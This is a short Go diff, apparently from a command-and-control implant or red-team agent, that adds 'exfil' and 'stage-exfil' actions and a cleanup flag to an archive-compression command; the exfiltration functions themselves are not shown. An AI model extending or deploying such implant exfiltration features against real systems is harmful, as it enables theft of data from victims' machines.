@@ -37,6 +37,7 @@ type CompressParams struct {
 	Format   string `json:"format"`
 	MaxDepth int    `json:"max_depth"`
 	MaxSize  int64  `json:"max_size"`
+	Cleanup  bool   `json:"cleanup"`
 }
 
 // detectFormat determines archive format from params or file extension.
@@ -85,8 +86,12 @@ func (c *CompressCommand) Execute(task structs.Task) structs.CommandResult {
 		return compressExtract(params)
 	case "stage":
 		return compressStage(task, params)
+	case "exfil":
+		return compressExfil(task, params)
+	case "stage-exfil":
+		return compressStageExfil(task, params)
 	default:
-		return errorf("Unknown action: %s (use 'create', 'list', 'extract', or 'stage')", params.Action)
+		return errorf("Unknown action: %s (use 'create', 'list', 'extract', 'stage', 'exfil', or 'stage-exfil')", params.Action)
 	}
 }
 
